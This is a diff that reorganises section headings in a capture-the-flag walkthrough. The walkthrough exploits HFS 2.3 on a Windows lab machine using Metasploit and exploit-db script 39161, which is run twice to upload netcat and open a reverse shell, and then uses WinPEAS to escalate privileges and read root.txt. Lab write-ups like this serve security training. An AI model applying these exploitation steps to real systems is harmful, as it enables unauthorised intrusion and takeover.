@@ -7,13 +7,11 @@
 Use Metasploit for initial access, Powershell for Windows privilege escalation enumeration, and gain 
 Administrator access.
 
-## Gaining a foothold
-
-### Exploring
+## Exploring
 
 Looking in web developer tools that employee of the months name is Bill Harper. Not much more to find.
 
-### Scanning
+## Scanning
 
 ```text
 # nmap -sV -sC -oN nmap.out -p- <IP address target> -vv
@@ -129,6 +127,8 @@ There is also a SSL service running on port 3389, which encrypts RDP sessions.
 
 The http server on port 8080 is running HFS 2.3.
 
+## Gaining a foothold
+
 ```text
 ─# searchsploit http file server -w
 ------------------------------------------------------------------------- --------------------------------------------
@@ -147,7 +147,6 @@ Papers: No Results
 
 There are several exploits possible for version 2.3.x. 
 [Remote Command Execution (1)](https://www.exploit-db.com/exploits/34668) gives the CVE.
-
 
 ```text
 # msfconsole
@@ -245,9 +244,7 @@ And when the connection is made, get the root flag:
     C:\Users\Administrator\Desktop>type root.txt
     type root.txt
 
-## Access and escalation without metasploit
-
-### Initial access
+## Initial access without metasploit
 
 [Download the exploit](https://www.exploit-db.com/raw/39161) by copying the raw text and rename it into something like
 `39161.py`. Edit the script: Set the local IP address and Port to those of the attack machine. The script 
@@ -281,7 +278,7 @@ netcat binary to the target and the second time will execute the payload to gain
     # python2 39161.py <IP address target machine> 8080
     # python2 39161.py <IP address target machine> 8080
 
-### Escalation
+## Escalation without metasploit
 
 [Download a WINPEAS binary](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and put it in 
 `~/Downloads` where the `http.server` is running.
